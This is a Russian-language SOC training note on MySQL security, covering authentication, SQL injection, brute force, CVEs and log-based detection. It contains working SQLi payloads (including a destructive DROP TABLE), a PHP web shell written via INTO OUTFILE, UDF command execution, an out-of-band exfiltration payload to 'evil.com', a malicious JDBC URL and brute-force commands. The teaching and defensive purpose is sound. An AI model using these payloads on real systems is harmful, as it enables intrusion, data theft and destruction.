# Тема 6.7: MySQL — Порт 3306

Изучение системы управления базами данных MySQL: архитектура «клиент-сервер», методы аутентификации (`mysql_native_password`, `caching_sha2_password`), основные команды, SQL-инъекции, брутфорс, анализ логов (`general_log`, `error_log`), RCE через `INTO OUTFILE` и UDF, анализ трафика в Wireshark, а также hardening по CIS Benchmark.

---

## 1. MySQL — Базовые свойства

- **Уровень OSI:** Прикладной (L7).
- **Транспорт:** TCP (порт `3306`), Unix socket (локально), Windows named pipe.
- **PDU:** MySQL-пакет (клиент-серверный протокол).
- **Принцип работы:** MySQL — открытая реляционная СУБД (RDBMS), использующая SQL. Сервер принимает подключения от клиентов (приложений, админ-утилит), выполняет SQL-запросы и возвращает результаты. Протокол — **проприетарный**, стандарта RFC для него не существует (в отличие от HTTP, SMTP, DNS). Спецификация публикуется Oracle в документации `dev.mysql.com`.

> **Почему это важно для SOC:** MySQL — цель №1 для SQL-инъекций и один из главных источников утечек данных. Через MySQL злоумышленники могут читать/записывать файлы (при наличии привилегии FILE), выполнять код (через UDF или `INTO OUTFILE`), а также использовать его как промежуточный узел для lateral movement. Анализ логов и трафика MySQL позволяет выявить SQL-инъекции, брутфорс и подозрительные запросы.

### 1.1. Порты MySQL

| Порт          | Назначение                   | Описание                                                                                                                   |
| :------------ | :--------------------------- | :------------------------------------------------------------------------------------------------------------------------- |
| **3306**      | Классический MySQL-протокол  | Основной порт для подключения клиентов. Может быть изменён в `my.cnf`.                                                     |
| **33060**     | X Protocol (MySQL 8.0+)      | Стандартный порт сервера MySQL для X Protocol.                                                                             |
| **6446/6447** | MySQL Router (Classic)       | Порты маршрутизатора для classic protocol (Read/Write и Read-Only).                                                        |
| **6448/6449** | MySQL Router (X Protocol)    | Порты маршрутизатора для X Protocol (Read/Write и Read-Only). Актуальные (с Router 8.0.24+).                               |
| **64460**     | MySQL Router (X Protocol RW) | Порт маршрутизатора для X Protocol (read-write). Старый дефолтный порт (до 8.0.24), используется при `--conf-base-port=0`. |
| **64470**     | MySQL Router (X Protocol RO) | Порт маршрутизатора для X Protocol (read-only). Старый дефолтный порт (до 8.0.24), используется при `--conf-base-port=0`.  |
*Таб. 1. Порты MySQL.*

> **Примечание:** Порты `64460` и `64470` — это стандартные порты MySQL Router для X Protocol (RW/RO) при использовании `--conf-base-port=0`. В версиях Router 8.0.24+ по умолчанию используются порты `6448` и `6449`.

> **Примечание:** Порт 3306 — стандартный, поэтому является **основной целью для автоматических сканеров**. Изменение порта на нестандартный — базовый приём hardening'а (security by obscurity), но не замена правильной аутентификации.

> **Пояснение:** Порты `64460` и `64470` — это порты **MySQL Router** (промежуточного компонента, который маршрутизирует трафик к бэкенд-серверам MySQL), а не самого сервера MySQL. `64460` — для X Protocol read-write, `64470` — для X Protocol read-only.

### 1.2. Основные компоненты

- **MySQL Server** — процесс `mysqld`, обслуживающий подключения.
- **MySQL Client** — утилита `mysql`, `mysqladmin`, `mysqldump` для подключения и управления.
- **Storage Engines** — InnoDB (по умолчанию), MyISAM, Memory, Archive.
- **Plugin Directory** — каталог для загрузки плагинов (UDF, аутентификация).
- **Configuration files** — `/etc/mysql/my.cnf`, `/etc/my.cnf`, `~/.my.cnf`.

## 2. Структура MySQL-протокола и подключение

### 2.1. Фазы подключения

1. **TCP Handshake** — клиент устанавливает соединение с портом 3306.
2. **Server Greeting** — сервер отправляет приветствие с версией, thread ID, salt (nonce).
3. **Client Handshake Response** — клиент отправляет логин, хеш пароля, capabilities, charset.
4. **Authentication** — сервер проверяет учётные данные через плагин аутентификации.
5. **Query/Response** — клиент отправляет SQL-запросы, сервер возвращает результаты.

> **Ключевая особенность:** Пароль **никогда не передаётся в открытом виде**. В `mysql_native_password` используется SHA-1-хеш с nonce, в `caching_sha2_password` — SHA-256 с RSA или TLS.

### 2.2. Основные команды SQL

| Команда | Назначение |
| :--- | :--- |
| `SHOW DATABASES;` | Список баз данных |
| `USE <database>;` | Выбор базы данных |
| `SHOW TABLES;` | Список таблиц в текущей БД |
| `SHOW COLUMNS FROM <table>;` | Структура таблицы |
| `SELECT * FROM <table>;` | Все данные из таблицы |
| `SELECT * FROM <table> WHERE <col> = "<val>";` | Фильтрация |
| `SELECT version();` | Версия MySQL |
| `SELECT user();` | Текущий пользователь |
| `SELECT database();` | Текущая база данных |
| `SHOW GRANTS;` | Права текущего пользователя |
| `SHOW GRANTS FOR 'root'@'localhost';` | Права конкретного пользователя |
| `SELECT * FROM mysql.user;` | Список пользователей и хеши паролей |
*Таб. 2. Основные SQL-команды.*

> **Важно:** Имена баз данных **чувствительны к регистру**, SQL-ключевые слова — нет. Рекомендуется писать команды в верхнем регистре (`SELECT`, `USE`) для читаемости.

### 2.3. Полезные команды подключения

```bash
# Локальное подключение (Unix socket)
mysql -u root -p

# Удалённое подключение
mysql -h <IP> -u root -p

# Подключение через нестандартный порт (заглавная P!)
mysql -u root -ppassword -h 83.136.254.13 -P 35258

# Выполнение одной команды
mysql -u root -p -h 127.0.0.1 -e 'show databases;'

# Выполнение SQL-файла
mysql -u root -p < commands.sql
```

> **Пояснение:** При выполнении одной команды без `-p` команда не сработает, если у пользователя стоит пароль или `auth_socket`. С `-p` MySQL запросит пароль интерактивно.

## 3. Аутентификация MySQL

### 3.1. mysql_native_password (устарел)

**Статус:** Deprecated as of MySQL 8.0.34, disabled by default in 8.4, **removed as of MySQL 9.0.0**.

**Механизм:** SHA-1-хеш пароля с nonce (challenge-response). Пароль никогда не передаётся в открытом виде, но SHA-1 считается криптографически слабым.

**Установка:**
```ini
[mysqld]
mysql_native_password=ON
```
Или через параметр запуска: `--mysql-native-password=ON`

**Создание пользователя:**
```sql
CREATE USER 'nativeuser'@'localhost'
IDENTIFIED WITH mysql_native_password BY 'password';
```

**Когда использовать:** Только для совместимости с legacy-приложениями. В новых проектах — не использовать.

### 3.2. caching_sha2_password (актуальный стандарт)

**Статус:** Плагин по умолчанию с MySQL 8.4. Заменяет `mysql_native_password`.

**Механизм:** SHA-256-хеш с кэшированием на серверной стороне (in-memory cache). При первом подключении — проверка по `mysql.user`, при повторных — по кэшу (быстрее).

**Ключевые особенности:**
- Пароли **никогда не передаются в открытом виде**.
- Если соединение защищено TLS или Unix socket — пароль передаётся как cleartext, но внутри шифрованного канала.
- Если соединение **не защищено** — используется **RSA key pair** для обмена паролем.

**Создание пользователя:**
```sql
CREATE USER 'sha2user'@'localhost'
IDENTIFIED WITH caching_sha2_password BY 'password';
```

**RSA-конфигурация (для небезопасных соединений):**
```ini
[mysqld]
caching_sha2_password_private_key_path=/usr/local/mysql/myprivkey.pem
caching_sha2_password_public_key_path=/usr/local/mysql/mypubkey.pem
```

**Подключение с RSA:**
```bash
# Запросить публичный ключ у сервера
mysql --ssl-mode=DISABLED -u sha2user -p --get-server-public-key

# Использовать локальную копию ключа
mysql --ssl-mode=DISABLED -u sha2user -p --server-public-key-path=file_name
```

> **Важно:** Первое подключение после создания аккаунта, смены пароля, `RENAME USER` или `FLUSH PRIVILEGES` **требует защищённого соединения** (TLS, Unix socket) или RSA. После успешной аутентификации аккаунт попадает в кэш, и последующие подключения не требуют TLS.

### 3.3. Управление пользователями

```sql
-- Просмотр пользователей и плагинов
SELECT user, host, plugin, account_locked FROM mysql.user;

-- Создание пользователя

-- Выдача прав
GRANT SELECT, CREATE, DROP, UPDATE, DELETE, INSERT ON *.* TO 'test'@'%' WITH GRANT OPTION;

-- Просмотр грантов
SHOW GRANTS FOR 'root'@'localhost';

-- Смена пароля (современный синтаксис)
ALTER USER 'root'@'localhost' IDENTIFIED BY 'MyNewPass123!';

-- Удаление пользователя
DROP USER 'test'@'%';
```

### 3.4. Привилегии: основные типы

| Привилегия | Что даёт | Риск |
| :--- | :--- | :--- |
| **SELECT** | Чтение данных | Кража данных |
| **INSERT / UPDATE / DELETE** | Изменение данных | Подмена данных |
| **FILE** | Чтение/запись файлов на сервере | **КРИТИЧНО** — RCE через `INTO OUTFILE` |

| **PROCESS** | Просмотр процессов | Утечка информации |

| **CREATE FUNCTION** | Создание UDF | RCE через UDF |

## 4. SQL-инъекции (SQLi)

### 4.1. Суть уязвимости

SQL-инъекция возникает, когда пользовательские данные **попадают в SQL-запрос без параметризации**. Злоумышленник может изменить логику запроса, получить доступ к чужим данным, выполнить административные команды или даже RCE.

**Пример уязвимого кода (PHP):**
```php
$query = "SELECT * FROM products WHERE category = '" . $_GET['category'] . "'";
```

**Пример эксплуатации:**
```text
https://example.com/products?category=Gifts'--
```
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Двойное тире `--` — комментарий в SQL. Всё после него игнорируется → возвращаются все товары, включая невыпущенные.

### 4.2. Классические payload'ы

| Payload | Назначение |
| :--- | :--- |
| `' OR '1'='1` | Обход аутентификации |
| `' OR 1=1--` | Возврат всех записей |
| `' UNION SELECT username, password FROM users--` | Извлечение данных из других таблиц |
| `' UNION SELECT 1,2,3,4,group_concat(table_name) FROM information_schema.tables--` | Список таблиц |
| `' AND SLEEP(5)--` | Blind SQLi (задержка) |
| `'; DROP TABLE users;--` | Уничтожение данных |
*Таб. 4. Классические payload'ы SQLi.*

### 4.3. Типы SQL-инъекций

| Тип | Описание | Обнаружение |
| :--- | :--- | :--- |
| **In-band (классическая)** | Результаты возвращаются в ответе приложения | `UNION SELECT`, `OR 1=1` |
| **Blind (слепая)** | Результаты не возвращаются, но логика/задержки видны | `SLEEP(5)`, `IF(1=1, SLEEP(5), 0)` |
| **Out-of-band (OAST)** | Данные передаются через внешний канал (DNS, HTTP) | `LOAD_FILE(CONCAT('\\\\', (SELECT ...), '.evil.com\\a'))` |
| **Second-order** | Payload сохраняется в БД и срабатывает позже | Анализ кода, мониторинг аномалий |
*Таб. 5. Типы SQL-инъекций.*

### 4.4. Определение версии и структуры БД

```sql
-- Версия MySQL
SELECT version();
SELECT @@version;

-- Список таблиц
SELECT * FROM information_schema.tables;

-- Список столбцов в таблице
SELECT column_name FROM information_schema.columns WHERE table_name='users';

-- Текущий пользователь и БД
SELECT user();
SELECT database();
```

### 4.5. Эксплуатация через SQLi → RCE

**Метод 1: INTO OUTFILE (запись файлов)**
```sql
' UNION SELECT "<?php system($_GET['shell']); ?>" INTO OUTFILE "/var/www/html/upload.php";
```
Требует привилегию **FILE** и доступ на запись в целевую директорию. `secure_file_priv` может ограничить путь.

**Метод 2: LOAD_FILE (чтение файлов)**
```sql
SELECT LOAD_FILE("/etc/passwd");
```
Требует привилегию **FILE** и чтобы файл был читаем для пользователя `mysqld`.

**Метод 3: UDF (User-Defined Function)**
Требует привилегию `CREATE FUNCTION` и доступ на запись в `plugin_dir`. Позволяет выполнять системные команды через `sys_exec()`.

```sql
-- Создание функции
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';

-- Выполнение команды
SELECT sys_exec('id > /tmp/out.txt');
```

### 4.6. Обнаружение SQL-инъекций в логах

**Включение `general_log`:**
```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';
```
Или в `my.cnf`:
```ini
[mysqld]
general_log = 1
general_log_file = /var/log/mysql/general.log
```

**Что искать в логах:**
- Запросы с ключевыми словами: `UNION SELECT`, `OR 1=1`, `--`, `SLEEP(`, `LOAD_FILE`, `INTO OUTFILE`.
- Аномально длинные запросы.
- Запросы к `information_schema` от непривилегированных пользователей.

**Пример записи в `general_log`:**
```
2026-09-13T10:15:23.123456Z  15 Query  SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'
```

## 5. Брутфорс MySQL

### 5.1. Инструменты

**Hydra:**
```bash
hydra -L users.txt -P passwords.txt mysql://<IP>
hydra -l root -P passwords.txt mysql://<IP>
```
- `-L` — файл с логинами.
- `-P` — файл с паролями.
- `-f` — остановиться после первого успеха.

![Пример брутфорса MySQL через Hydra.png](/attachments/networking/06_ports/6.7-mysql-3306/Пример%20брутфорса%20MySQL%20через%20Hydra.png)

*Рис. 5. Пример брутфорса MySQL через Hydra: 0 valid password found (тестовая VM).*

**Nmap (скрипт mysql-brute):**
```bash
# Подготовка словаря (формат username/password)
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt -O mysql-creds.txt
sed -i 's/:/\//g' mysql-creds.txt

# Брутфорс
nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt <IP>
```

**Metasploit:**
```text
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set rhosts <IP>
msf auxiliary(mysql_login) > set user_file user.txt
msf auxiliary(mysql_login) > set pass_file pass.txt
msf auxiliary(mysql_login) > set stop_on_success true
msf auxiliary(mysql_login) > run
```

> **Важный нюанс:** в MySQL 8.0 ошибки аутентификации (`Access denied`) **не всегда попадают в `error.log`** (зависит от настроек `log_warnings`). Поэтому на скриншоте `Access denied` нет — это нормально.

**Признаки:**
- Массовые `Access denied` с одного IP.
- Повторяющиеся неудачные попытки с короткими интервалами.
- Успешный вход после серии неудач (проверить `general_log`).

## 7. Обнаружение и логи (Detection)

### 7.1. Основные логи MySQL

| Лог | Назначение | Путь |
| :--- | :--- | :--- |
| **Error log** | Ошибки, проблемы запуска, `Access denied` | `/var/log/mysql/error.log` |
| **General log** | Все SQL-запросы (медленно, только для отладки) | `/var/log/mysql/general.log` |
| **Slow query log** | Запросы дольше `long_query_time` | `/var/log/mysql/slow.log` |
| **Binary log** | Изменения данных (для репликации) | `/var/log/mysql/binlog.*` |
| **Audit log** | Аудит (только в Enterprise) | — |
*Таб. 9. Основные логи MySQL.*

### 7.2. Что искать в логах

**Error log:**
- `Access denied for user` — попытки несанкционированного доступа.
- `Too many connections` — возможный DoS.
- `Got an error reading communication packets` — обрыв соединения.

**General log:**
- SQL-запросы с `UNION SELECT`, `OR 1=1`, `INTO OUTFILE`, `LOAD_FILE` — SQL-инъекции.
- Аномально длинные запросы.
- Запросы к `information_schema` — reconnaissance.
- Запросы `SELECT * FROM mysql.user` — попытки дампа учёток.

**Slow query log:**
- Тяжёлые запросы без индексов — могут быть DoS.
- Запросы с `SLEEP()`, `BENCHMARK()` — Blind SQLi.

### 7.3. Ключевые признаки инцидента

| Признак | Возможная атака |
| :--- | :--- |
| Массовые `Access denied` с одного IP | Брутфорс |
| `Access denied` затем успешный вход | Успешный подбор пароля |
| `UNION SELECT` в general_log | SQL-инъекция |
| `INTO OUTFILE` в general_log | Попытка RCE через запись файла |
| `LOAD_FILE` в general_log | Попытка чтения файлов |
| `CREATE FUNCTION ... SONAME` | Попытка UDF RCE |
| Новые пользователи в `mysql.user` | Persistence / backdoor |
| Изменения в `mysql.user` от непривилегированного пользователя | Эскалация привилегий |

## 8. Уязвимости и RCE

### 8.1. CVE-2016-6662 (RCE через my.cnf)

**Суть:** Уязвимость в MySQL/MariaDB/Percona позволяет локальному пользователю с низкими привилегиями (`CREATE/INSERT/SELECT`) повысить привилегии до **root** через манипуляции с `my.cnf`.

**Механизм:**
- Пользователь БД может указать путь к конфигурационному файлу через `SELECT ... INTO OUTFILE`.
- MySQL использует файл при следующем запуске (или перезагрузке через `mysqld_safe`).
- Злоумышленник внедряет в конфиг директиву, которая выполняет произвольный код от имени `root`.

**Уязвимые версии:**
- MySQL ≤ 5.5.51, ≤ 5.6.32, ≤ 5.7.14
- MariaDB < 5.5.52, < 10.1.18, < 10.0.28
- Percona Server < 5.5.51-38.2, < 5.6.32-78-1, < 5.7.14-8

**Защита:** Обновить до актуальных версий.

### 8.2. CVE-2016-6663 / CVE-2016-6664 (Race Condition)

**Суть:** Race condition в `REPAIR TABLE` позволяет получить SUID-шелл от пользователя `mysql`, а затем повысить привилегии до `root` через `mysqld_safe`.

**Механизм:**
- Злоумышленник создаёт таблицу с правами 777, использует `REPAIR TABLE` и выигрывает race condition.
- Временный файл таблицы заменяется симлинком на `/bin/bash`.
- MySQL применяет права SUID → шелл от `mysql`.

**Защита:** Обновить до актуальных версий, ограничить права пользователей БД.

### 8.3. CVE-2012-2122 (Auth Bypass)

**Суть:** Ошибка в сравнении хешей паролей позволяла подобрать пароль путём повторных попыток. При 256 попытках вероятность успеха ≈ 1/256.

**Проверка:** `nmap --script mysql-vuln-cve2012-2122 <IP>`.

**Защита:** Обновить MySQL до 5.5.24+ / 5.1.63+.

### 8.4. CVE-2023-21971 (JDBC propertiesTransform RCE)

**Суть:** В MySQL Connector/J до 8.0.32 злоумышленник, контролирующий JDBC URL, мог указать класс через `propertiesTransform`. Драйвер загружал и инстанцировал его → RCE в контексте клиента.

**Пример:** `jdbc:mysql://attacker:3306/test?user=root&password=root&propertiesTransform=com.evil.Evil`

**Защита:** Обновить Connector/J до 8.0.33+. Не принимать JDBC-параметры от пользователя.

### 8.5. CVE-2026-59971 (mysql_mcp_server RCE)

**Суть:** Уязвимость в **стороннем проекте** `mysql_mcp_server` (middleware для интеграции MySQL с Model Context Protocol). В режиме SSE/HTTP отключалась защита от DNS-rebinding → RCE через `execute_sql`.

**CVSS 3.1: 10.0 (CRITICAL).**

> **Важно:** Это уязвимость **не в самом MySQL**, а в middleware-проекте, который работает с MySQL. Хороший пример атаки на цепочку поставок (Supply Chain Attack).

**Исправлено:** в версии 0.4.2.

> **Пояснение:** CVE реальная, но относится к стороннему проекту. Уточнение важно, чтобы не путать уязвимость СУБД с уязвимостью экосистемы.

### 8.6. Rogue MySQL Server

**Суть:** Если клиент подключается к подконтрольному злоумышленнику серверу MySQL (например, через подмену DNS), сервер может:
- Запросить у клиента чтение локального файла через `LOAD DATA LOCAL INFILE`.
- Выполнить Java-десериализацию (если включён `autoDeserialize=true` в Connector/J).

**Инструменты:**
- `allyshka/Rogue-MySql-Server` — Python PoC.
- `4ra1n/mysql-fake-server` — Java PoC.

**Защита:**
- `allowLoadLocalInfile=false`.
- `autoDeserialize=false`.
- Не принимать JDBC-параметры от пользователя.

## 10. Разбор сложных инженерных ситуаций и аномалий

### 10.1. SQL-инъекция через POST-параметр

**Суть:** Многие считают, что SQLi возможна только через GET-параметры (`?id=1`). На самом деле **POST-параметры, Cookies, HTTP-заголовки** (`User-Agent`, `Referer`, `X-Forwarded-For`) — всё это может быть вектором инъекции.

**Пример:**
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=
```

**Обнаружение:** В `general_log` видно, что запрос пришёл от POST-формы, а payload — в теле.

> **Важно:** WAF часто настроен только на GET-параметры и пропускает POST. Поэтому при тестировании всегда проверяйте все точки входа.

### 10.2. Слепая SQL-инъекция (Blind SQLi)

**Суть:** Приложение не возвращает результаты SQL-запроса и не показывает ошибки. Но злоумышленник может определить истинность условия по **косвенным признакам**:
- **Boolean-based:** разница в ответе (например, «пользователь существует» vs «не существует»).
- **Time-based:** задержка в ответе через `SLEEP(5)`.
- **Out-of-band (OAST):** DNS/HTTP-запрос на сервер злоумышленника.

**Пример time-based payload'а:**
```sql
' AND IF(1=1, SLEEP(5), 0)--
```
Если ответ приходит с задержкой 5 секунд — условие истинно.

**Обнаружение в логах:** Запросы с `SLEEP()`, `BENCHMARK()`, `IF()` в `general_log`.

### 10.3. Обход WAF через комментарии и кодирование

**Суть:** WAF ищет ключевые слова `UNION SELECT`, но злоумышленник может обойти фильтр:
- **Комментарии:** `UNION/**/SELECT`
- **Регистр:** `UnIoN sElEcT`
- **URL-кодирование:** `%27` вместо `'`
- **Hex-кодирование:** `0x756e696f6e` вместо `union`
- **Двойное кодирование:** `%2527`

**Пример:**
```sql
'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
```

**Обнаружение в логах:** Аномальные символы (`/**/`, `%27`, `0x`) в SQL-запросах.

### 10.4. Second-order SQL-инъекция

**Суть:** Payload **сохраняется в БД** при первом запросе (например, при регистрации), а затем **срабатывает при другом запросе** (например, при просмотре профиля). Это делает атаку незаметной для WAF, который проверяет только входящие данные.

**Пример:**
1. Злоумышленник регистрируется с логином `admin'--`.
2. Payload сохраняется в БД как есть.
3. При смене пароля приложение выполняет:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Пароль администратора изменён.

**Обнаружение:** Аномальные данные в БД, которые выглядят как SQL-код.

### 10.5. MySQL запущен от root

**Суть:** Если `mysqld` запущен от пользователя `root`, любой пользователь с привилегией `FILE` может:
- Читать любые файлы на сервере (`/etc/shadow`).
- Писать файлы от имени `root` (`~root/.bashrc`).
- Выполнять UDF RCE от имени `root`.

**Как проверить:**
```bash
ps -ef | grep mysqld
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep "user"
systemctl status mysql 2>/dev/null | grep -o "user=."
```

**Защита:**
```ini
[mysqld]
user=mysql
```
Никогда не запускать `mysqld` от `root`.

### 10.6. Пустой пароль у root

**Суть:** Классическая ошибка — `root` без пароля. Даже в 2026 году встречается на тестовых и legacy-серверах.

**Проверка:**
```bash
mysql -u root
```

**Обнаружение:** В `error.log` — успешные входы без `Access denied`.

**Защита:**
```sql
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPass123!';
```

### 10.7. Rogue MySQL Server (кража файлов клиента)

**Суть:** Если клиент подключается к подконтрольному серверу (через подмену DNS), сервер может запросить у клиента чтение локального файла через `LOAD DATA LOCAL INFILE`.

**Пример:**
```sql
-- Сервер (злоумышленника) отправляет клиенту:
LOAD DATA LOCAL INFILE "/etc/passwd" INTO TABLE test FIELDS TERMINATED BY '\n';
-- Клиент читает свой /etc/passwd и отправляет на сервер
```

**Защита:**
- `allowLoadLocalInfile=false` в Connector/J.
- `local_infile=OFF` на сервере.
- `LOAD DATA LOCAL` отключён по умолчанию в MySQL 8.0+.

### 10.8. Race condition в REPAIR TABLE (CVE-2016-6663)

**Суть:** При выполнении `REPAIR TABLE` между `lstat()` и `chmod()` возникает состояние гонки. Злоумышленник может заменить временный файл таблицы симлинком на `/bin/bash`, и MySQL применит к нему SUID-бит.

**Обнаружение:** Аномальные операции с временными файлами таблиц в `strace`.

**Защита:** Обновить MySQL до актуальной версии.

### 10.9. Аномально длинные SQL-запросы

**Суть:** Очень длинный SQL-запрос (десятки килобайт) может указывать на:
- Попытку исчерпания буфера (`max_allowed_packet`).
- Blind SQLi с извлечением данных по байтам.
- DoS-атаку.

**Обнаружение:** Запросы длиннее `max_allowed_packet` (по умолчанию 64 МБ).

### 10.10. Запросы к `information_schema` от непривилегированных пользователей

**Суть:** `information_schema` содержит метаданные о всех БД и таблицах. Обычное приложение не должно обращаться туда. Если запросы идут — это **reconnaissance** перед атакой.

**Обнаружение:** В `general_log` — `SELECT * FROM information_schema.tables` от пользователя приложения.

## 11. Границы и лимиты масштабирования MySQL

### 11.1. Основные лимиты

| Параметр                    | Значение по умолчанию               | Описание                                  |
| :-------------------------- | :---------------------------------- | :---------------------------------------- |
| **max_connections**         | 151                                 | Максимум одновременных подключений        |
| **max_user_connections**    | 0 (без лимита)                      | Максимум подключений на пользователя      |
| **max_allowed_packet**      | 64 МБ (MySQL 8.0), 4 МБ (MySQL 5.7) | Максимальный размер одного пакета/запроса |
| **thread_cache_size**       | 9                                   | Кэш потоков для новых подключений         |
| **table_open_cache**        | 4000                                | Максимум открытых таблиц                  |
| **innodb_buffer_pool_size** | 128 МБ                              | Размер буферного пула InnoDB              |
| **connect_timeout**         | 10 сек                              | Таймаут подключения                       |
| **wait_timeout**            | 28800 сек (8 ч)                     | Таймаут неактивного соединения            |
*Таб. 13. Основные лимиты MySQL.*

### 11.2. Что происходит при превышении лимитов

| Лимит | Что происходит | Ошибка |
| :--- | :--- | :--- |
| `max_connections` | Новые подключения отклоняются | `ERROR 1040 (HY000): Too many connections` |
| `max_user_connections` | Подключения конкретного пользователя отклоняются | `ERROR 1203: User ... has already more than 'max_user_connections'` |
| `max_allowed_packet` | Запрос обрывается | `ERROR 1153: Got a packet bigger than 'max_allowed_packet' bytes` |
| `table_open_cache` | Таблицы закрываются, производительность падает | — |
| `innodb_buffer_pool_size` | Рост дискового I/O | — |
*Таб. 14. Поведение при превышении лимитов.*

### 11.3. Домен коллизий и Broadcast Domain

- **Домен коллизий:** MySQL работает на L7, поэтому на L2 (Ethernet) домен коллизий определяется коммутатором. MySQL не влияет на L2-топологию.
- **Broadcast Domain:** MySQL использует TCP (unicast), не генерирует broadcast-трафик. Границы broadcast-домена определяются маршрутизаторами, не MySQL.

> **Важно:** MySQL — прикладной протокол. Он не влияет на L2/L3 топологию. Все ограничения — логические (количество подключений, размер запроса, память), а не физические.

### 11.4. Масштабирование MySQL

| Подход | Описание |
| :--- | :--- |
| **Вертикальное** | Увеличение RAM/CPU, настройка `innodb_buffer_pool_size`, `max_connections` |
| **Репликация (Master-Slave)** | Чтение с реплик, запись на master |
| **Шардирование** | Разделение данных по нескольким серверам |
| **Кластеризация (NDB, Galera)** | Синхронная репликация, автоматическое переключение |
| **Прокси (ProxySQL, HAProxy)** | Балансировка нагрузки, маршрутизация запросов |
*Таб. 15. Подходы к масштабированию MySQL.*

### 11.5. Аномалии масштабирования

- **Too many connections:** Массовые `ERROR 1040` могут указывать на DoS-атаку или утечку соединений в приложении.
- **Aborted_clients:** Резкий рост может указывать на сетевые проблемы или атаку.
- **Threads_running > max_connections:** Признак перегрузки.

**Проверка:**
```sql
SHOW STATUS LIKE 'Threads_connected';
SHOW STATUS LIKE 'Aborted_clients';
SHOW STATUS LIKE 'Max_used_connections';
```

## 12. Расширенный ИБ-контекст и инженерный FAQ

### 12.1. Векторы атак на MySQL

| Атака | Цель | Обнаружение | Защита |
| :--- | :--- | :--- | :--- |
| **SQL-инъекция** | Кража/подмена данных | `UNION SELECT` в логах | Параметризованные запросы |
| **Брутфорс** | Подбор паролей | Массовые `Access denied` | Политика паролей, 2FA |
| **RCE через UDF** | Выполнение кода | `CREATE FUNCTION` в логах | Отзыв `CREATE FUNCTION` |
| **RCE через INTO OUTFILE** | Запись веб-шелла | `INTO OUTFILE` в логах | Отзыв FILE, `secure_file_priv` |
| **Эскалация привилегий** | Root-доступ | Изменения в `mysql.user` | Минимальные привилегии |
| **Rogue Server** | Кража данных клиента | Аномальный DNS/трафик | `allowLoadLocalInfile=false` |
| **DoS** | Отказ в обслуживании | `Too many connections` | `max_connections`, rate limiting |
*Таб. 16. Векторы атак на MySQL.*

### 12.2. Инженерный FAQ

**Вопрос: Чем `caching_sha2_password` лучше `mysql_native_password`?**
**Ответ:** SHA-256 vs SHA-1, кэширование (быстрее), RSA-обмен паролем на небезопасных соединениях.

**Вопрос: Что такое `secure_file_priv`?**
**Ответ:** Переменная, ограничивающая операции `INTO OUTFILE` и `LOAD_FILE` указанной директорией. `NULL` = полностью отключить.

**Вопрос: Как обнаружить SQL-инъекцию в логах?**
**Ответ:** Искать `UNION SELECT`, `OR 1=1`, `INTO OUTFILE`, `LOAD_FILE`, `SLEEP(` в `general_log`.

**Вопрос: Что такое UDF RCE?**
**Ответ:** Загрузка пользовательской библиотеки в `plugin_dir` и создание функции `sys_exec()` для выполнения системных команд. Требует `CREATE FUNCTION` и доступ на запись в `plugin_dir`.

**Вопрос: Как защититься от Rogue MySQL Server?**
**Ответ:** `allowLoadLocalInfile=false`, `autoDeserialize=false`, не принимать JDBC-параметры от пользователя.

**Вопрос: Что делать SOC-аналитику при подозрении на SQLi?**
**Ответ:**
1. Проверить `general_log` на payload'ы.
2. Проверить Wireshark (`mysql.query`).
3. Проверить, от какого пользователя выполнялись запросы.
4. Проверить, не было ли чтения/записи файлов.
5. Проверить целостность данных (не изменены ли таблицы).

**Вопрос: Какие CVE критичны для MySQL?**
**Ответ:** CVE-2016-6662 (RCE через my.cnf), CVE-2016-6663/6664 (race condition), CVE-2012-2122 (auth bypass), CVE-2023-21971 (JDBC RCE), CVE-2026-59971 (mysql_mcp_server RCE).

**Вопрос: Как проверить, не скомпрометирован ли MySQL?**
**Ответ:**
1. Проверить `mysql.user` — нет ли новых пользователей.
2. Проверить `SHOW GRANTS` — не расширены ли права.
3. Проверить `general_log` на аномальные запросы.
4. Проверить файлы в `plugin_dir` — нет ли лишних `.so`/`.dll`.
5. Проверить процессы `mysqld` — не запущен ли от root.
6. Проверить `secure_file_priv` — не пустой ли он.

**Вопрос: Что такое `LOAD DATA LOCAL INFILE` и чем он опасен?**
**Ответ:** Позволяет серверу запросить у клиента чтение локального файла. Если клиент подключается к Rogue-серверу, злоумышленник может украсть `/etc/passwd`, SSH-ключи и др.

**Вопрос: Как часто нужно обновлять MySQL?**
**Ответ:** Регулярно, при выходе патчей безопасности. Подписка на Oracle Critical Patch Updates (CPU) — обязательна.

## Заключение

MySQL — фундаментальная СУБД, широко используемая в веб-приложениях. Для SOC-аналитика критично понимать: методы аутентификации (`mysql_native_password` vs `caching_sha2_password`), механизмы SQL-инъекций (in-band, blind, second-order), векторы RCE (UDF, `INTO OUTFILE`, JDBC), а также инструменты обнаружения (Wireshark, `general_log`, `error.log`). Hardening по CIS Benchmark — обязательный минимум для любого production-сервера. Защита строится на комплексе мер: минимальные привилегии, строгая политика паролей, TLS, `secure_file_priv`, мониторинг логов.
